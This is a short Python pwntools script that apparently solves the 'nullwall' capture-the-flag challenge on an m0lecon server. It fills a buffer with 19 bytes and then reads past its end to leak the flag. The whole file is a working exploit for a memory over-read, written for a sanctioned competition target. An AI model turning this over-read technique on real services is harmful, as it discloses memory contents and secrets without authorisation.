#!/usr/bin/env python3
from pwn import *

def clear() -> None:
    r.recvuntil(b': ')

r = remote('nullwall.challs.m0lecon.it', 1337)
r.sendline(b'1')
clear()
r.sendline(b'a'*19)
clear()
r.sendline(b'2')
clear()
r.recvuntil(b'a\n') # end of my buffer
flag = r.recvuntil(b'}') # end of the flag

print(flag.decode())